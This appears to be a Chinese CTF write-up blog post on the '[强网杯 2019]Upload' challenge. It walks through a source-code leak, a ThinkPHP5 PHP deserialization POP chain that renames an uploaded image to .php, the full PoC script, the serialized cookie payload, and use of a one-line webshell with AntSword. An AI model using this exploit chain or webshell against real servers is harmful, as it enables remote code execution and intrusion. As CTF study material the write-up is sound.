---
title: '[强网杯 2019]Upload'
date: 2024-08-18 19:51:00
tags: 
      - 题解
      - 反序列化
categories: 刷题笔记
---

## [强网杯 2019]Upload

我们先注册登录，到新页面后发现可以上传文件

![image-20240818223750069](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182237171.png)

<!--more-->

我们试着上传一句话木马

![image-20240818224044083](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182240573.png)

我们上传的是一个jpg格式的文件，传上去之后被改后缀为png，而且可以看到路径和文件名都进行了重命名使用md5值

我们对页面进行目录扫描，扫描出一个www.tar.gz在网站根目录，我们下载下来，发现是ThinkPHP5框架

![image-20240818224337717](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182243781.png)

而且存在.idea目录
(.idea是存放项目的配置信息，包括历史记录，版本控制信息等的一个目录)

我们在controller文件夹中发现两个断点

![image-20240818224518931](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182245026.png)

![image-20240818224531737](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182245819.png)

Index.php 里的：首先访问大部分页面例如 index 都会调用 login_check 方法。
该方法会先将传入的用户 Profile 反序列化，而后到数据库中检查相关信息是否一致。

Register.php 里的：Register 的析构方法，估计是想判断注没注册，没注册的给调用 check 也就是 Index 的 index 方法，也就是跳到主页了

接着审计上传逻辑代码

![image-20240818225148480](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182251577.png)

先检查是否登录，然后判断是否有文件，然后获取后缀，解析图片判断是否为正常图片，再从临时文件拷贝到目标路径

而 Profile 有 \_call 和 \_get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。\_get 会直接从 except 里找，_call 会调用自身的 name 成员变量所指代的变量所指代的方法。

![image-20240818225830147](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182258224.png)

这两个魔术方法加上反序列化和析构函数的调用，结合起来就可以操控 Profile 里的参数，控制其中的 upload_img 方法，这样我们就能任意更改文件名，让其为我们所用了。

构造一个 Profile 和 Register 类，命名空间 app\web\controller（要不然反序列化会出错，不知道对象实例化的是哪个类）。然后给其 except 成员变量赋值 [‘index’ => ‘img’]，代表要是访问 index 这个变量，就会返回 img。而后又给 img 赋值 upload_img，让这个对象被访问不存在的方法时最终调用 upload_img。

![image-20240903220855170](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409032208224.png)

而后又赋值控制 filename_tmp 和 filename 成员变量。可以看到前面两个判断我们只要不赋值和不上传变量即可轻松绕过。ext 这里也要赋值，让他进这个判断。而后程序就开始把 filename_tmp 移动到 filename，这样我们就可以把 png 移动为 php 文件了。

还要构造一个 Register，checker 赋值为 我们上面这个 $profile，registed 赋值为 false，这样在这个对象析构时就会调用 profile 的 index 方法，再跳到 upload_img 了。

poc

```
<?php

namespace app\web\controller;
error_reporting(0);
class Profile
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except;


    public function __get($name)
    {
        return $this->except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
        }
    }

}

class Register
{
    public $checker;
    public $registed;

    public function __destruct()
    {
        if(!$this->registed){
            $this->checker->index();
        }
    }

}

$profile = new Profile();
$profile->except = ['index' => 'img'];
$profile->img = "upload_img";
$profile->ext = "png";
$profile->filename_tmp = "./upload/76d9f00467e5ee6abc3ca60892ef304e/1905e3297318e07f689eeda3afb79dc7.png";
$profile->filename = "./upload/76d9f00467e5ee6abc3ca60892ef304e/1905e3297318e07f689eeda3afb79dc7.php";

$register = new Register();
$register->registed = false;
$register->checker = $profile;

echo urlencode(base64_encode(serialize($register)));

```

注意这里的文件路径，看 Profile 的构造方法有切换路径，这里我们反序列化的话似乎不会调用构造方法，所以得自己指定一下路径。

```
TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO047czoxMjoiZmlsZW5hbWVfdG1wIjtzOjc4OiIuL3VwbG9hZC83NmQ5ZjAwNDY3ZTVlZTZhYmMzY2E2MDg5MmVmMzA0ZS8xOTA1ZTMyOTczMThlMDdmNjg5ZWVkYTNhZmI3OWRjNy5wbmciO3M6ODoiZmlsZW5hbWUiO3M6Nzg6Ii4vdXBsb2FkLzc2ZDlmMDA0NjdlNWVlNmFiYzNjYTYwODkyZWYzMDRlLzE5MDVlMzI5NzMxOGUwN2Y2ODllZWRhM2FmYjc5ZGM3LnBocCI7czoxMToidXBsb2FkX21lbnUiO047czozOiJleHQiO3M6MzoicG5nIjtzOjM6ImltZyI7czoxMDoidXBsb2FkX2ltZyI7czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czozOiJpbWciO319czo4OiJyZWdpc3RlZCI7YjowO30%3D

```



![image-20240903220824136](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409032208186.png)

放入cookie后在根目录刷新几次，发现再次访问这个文件夹就是php文件了，成功解析我们的一句话木马

![image-20240818231654128](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182316176.png)

然后连接蚁剑找flag

![image-20240818231723489](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182317637.png)
